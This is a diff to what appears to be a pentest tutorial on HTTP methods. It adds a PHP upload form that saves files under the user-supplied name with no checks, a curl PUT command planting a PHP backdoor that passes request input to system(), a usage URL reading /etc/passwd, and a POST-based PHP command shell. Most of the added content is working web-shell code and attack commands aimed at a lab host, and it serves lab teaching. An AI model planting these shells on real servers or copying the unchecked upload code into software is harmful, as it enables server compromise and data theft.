@@ -270,7 +270,7 @@ vim php-reverse-shell.php
 ### Or uploading as data
 
 ```bash
-curl -X PUT -d "<?php phpinfo(); ?>" http://192.168.1.150/test/phpinfo.php
+curl -X PUT -d "<?php phpinfo(); ?>" http://192.168.1.12/test/phpinfo.php
 ```
 
 
@@ -284,3 +284,114 @@ curl -X DELETE http://192.168.1.12/test/php-reverse-shell.php
 
 ---
 
+## Example PHP File Upload Form
+
+**`fileupload.php` form:**
+
+```php
+<!doctype html>
+<html>
+<head>
+  <title>Form - Fileupload</title>
+</head>
+<body>
+
+<form action="fileupload.php" enctype="multipart/form-data" method="post">
+  Select File to Upload:<br>
+  <input name="filetoupload" type="file"><br>
+  <input name="submit" type="submit" value="Upload"><br>
+</form>
+
+<?php
+if (isset($_POST['submit'])) {
+
+  $file_name     = $_FILES["filetoupload"]["name"];
+  $file_type     = $_FILES["filetoupload"]["type"];
+  $file_tmp_name = $_FILES["filetoupload"]["tmp_name"];
+  $file_error    = $_FILES["filetoupload"]["error"];
+  $file_size     = $_FILES["filetoupload"]["size"];
+
+  echo "File Name = {$file_name} <br />";
+  echo "File Type = {$file_type} <br />";
+  echo "File Tmp Name = {$file_tmp_name} <br />";
+  echo "File Error = {$file_error} <br />";
+  echo "File Size = {$file_size} <br />";
+
+  if (move_uploaded_file($file_tmp_name, $file_name)) {
+    echo "File Uploaded Successfully";
+  } else {
+    echo "Could not Upload file";
+  }
+
+} else {
+  echo "Form was not submitted <br />";
+}
+?>
+</body>
+</html>
+```
+
+---
+
+## PHP Reverse Shell Upload Example
+
+**For uploading a simple PHP backdoor:**
+
+```bash
+curl --request PUT --url http://192.168.1.12/test/shell.php --header 'Content-Type: application/x-www-form-urlencoded' --data '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; die; } ?>'
+```
+
+---
+
+## Usage
+
+```text
+http://192.168.1.12/shell.php?cmd=cat+/etc/passwd
+```
+
+---
+
+## Example POST-based Command Shell
+
+**`shell-post.php` form:**
+
+```bash
+vim shell-post.php
+```
+
+```php
+<!doctype html>
+<html>
+<head>
+  <title>CMD Shell with POST</title>
+</head>
+<body>
+
+<form action="<?php echo $_SERVER["PHP_SELF"]; ?>" method="post">
+  CMD:<br>
+  <input name="cmd" type="text"><br>
+  <input name="submit" type="submit" value="cmd"><br>
+</form>
+
+<?php
+if (isset($_REQUEST["cmd"])) {
+  echo "<pre>";
+  system($_REQUEST["cmd"]);
+  echo "</pre>";
+  die;
+}
+?>
+</body>
+</html>
+```
+
+---
+
+## Conclusion
+
+* You explored HTTP methods: **GET, POST, PUT, DELETE**, etc.
+* Enumerated allowed methods with **nmap** and **curl**.
+* Used **PUT** to upload shells or files.
+* Demonstrated file upload forms and simple backdoors.
+
+---
